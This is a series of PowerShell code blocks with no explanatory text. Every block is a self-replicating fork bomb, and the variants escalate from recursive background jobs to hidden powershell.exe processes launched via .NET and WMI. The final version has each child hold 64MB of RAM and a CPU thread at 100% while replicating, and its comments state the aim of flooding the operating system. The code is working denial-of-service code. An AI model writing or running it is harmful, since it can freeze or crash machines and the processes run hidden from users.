~~~powershell
function f { f | Start-Job -ScriptBlock { f } }; f
~~~

~~~powershell
function f { f | Start-Job -ScriptBlock ${function:f} }; f
~~~
~~~powershell
function f { Start-Job -ScriptBlock ${function:f} | Out-Null }; do { f } while ($true)
~~~
~~~powershell
function f {
    $proc = [System.Diagnostics.Process]::Start([System.Diagnostics.ProcessStartInfo]@{
        FileName        = "powershell.exe"
        Arguments       = "-NoProfile -WindowStyle Hidden -Command  `${function:f} = '${function:f}'; f"
        CreateNoWindow  = $true
        UseShellExecute = $false
    })
}
do {
    f
} while ($true)
~~~
~~~powershell
function f {
    $null = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
        CommandLine = "powershell.exe -NoProfile -WindowStyle Hidden -Command `"${function:f} = '${function:f}'; f`""
    }
    for($i=0; $i -lt 100000; $i++) { $null = [Math]::Sqrt([Random]::new().Next()) }
}
f
~~~

~~~powershell
function f {
    # 1. We inject a payload that forces EACH new process to immediately lock 1 CPU thread at 100%
    # and physically consume 64MB of RAM before launching its own replication loop.
    $Payload = {
        # Keep a massive array alive in RAM to force true physical memory allocation
        $MemBlock = [byte[]]::new(67108864) # 64 Megabytes per process
        for($i=0; $i -lt $MemBlock.Length; $i += 4096) { $MemBlock[$i] = 255 }
        
        # Self-replication chain inside the child process
        ${function:f} = '$FunctionDefinition'
        [System.Diagnostics.Process]::Start([System.Diagnostics.ProcessStartInfo]@{
            FileName        = "powershell.exe"
            Arguments       = "-NoProfile -WindowStyle Hidden -Command `${function:f} = '${function:f}'; f"
            CreateNoWindow  = $true
            UseShellExecute = $false
        }) | Out-Null

        # Endless math calculation to hold the CPU thread permanently at 100%
        while($true) { $null = [Math]::Pow([Math]::Sqrt([Random]::new().Next()), 5) }
    }.ToString().Replace('$FunctionDefinition', ${function:f})

    # 2. Launch the hidden background process using your preferred native .NET method
    $proc = [System.Diagnostics.Process]::Start([System.Diagnostics.ProcessStartInfo]@{
        FileName        = "powershell.exe"
        Arguments       = "-NoProfile -WindowStyle Hidden -Command $Payload"
        CreateNoWindow  = $true
        UseShellExecute = $false
    })
}

# 3. Flat loop to flood the operating system with the optimized processes instantly
do {
    f
} while ($true)

~~~

~~~powershell

~~~

~~~powershell

~~~

